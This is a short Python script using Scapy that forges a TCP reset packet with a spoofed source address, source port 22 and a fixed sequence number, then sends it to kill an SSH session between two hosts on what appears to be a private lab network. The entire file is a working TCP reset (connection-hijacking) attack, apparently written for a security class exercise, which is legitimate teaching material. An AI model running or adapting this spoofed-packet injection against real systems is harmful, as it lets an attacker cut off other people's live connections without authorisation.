#!/usr/bin/python

from scapy.all import *

ip = IP(src="10.0.2.129", dst="10.0.2.128")
tcp = TCP(sport=22, dport=47810, flags="R", seq=1899899024)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
